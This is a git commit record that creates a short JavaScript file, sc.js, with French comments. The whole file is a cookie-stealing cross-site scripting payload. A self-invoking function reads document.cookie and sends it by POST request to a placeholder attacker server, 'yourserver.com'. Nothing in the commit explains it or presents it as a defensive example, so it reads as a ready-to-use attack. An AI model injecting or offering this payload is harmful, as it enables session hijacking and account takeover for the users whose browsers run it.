fe5716c0f847a6fce614dce6286794a00766c5fd
nikaiw <devillers.nicolas@gmail.com>
2023-11-18 15:19:52 +0100

    Create sc.js

---
+++ sc.js
@@ -0,0 +1,15 @@
+(function() {
+    var cookie = document.cookie;
+    var xhr = new XMLHttpRequest();
+    var yourServerURL = "https://yourserver.com/";
+
+    // Préparez les données à envoyer
+    var data = "cookie=" + encodeURIComponent(cookie);
+
+    // Configurez la requête
+    xhr.open("POST", yourServerURL, true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+    // Envoyez la requête avec les données
+    xhr.send(data);
+})();
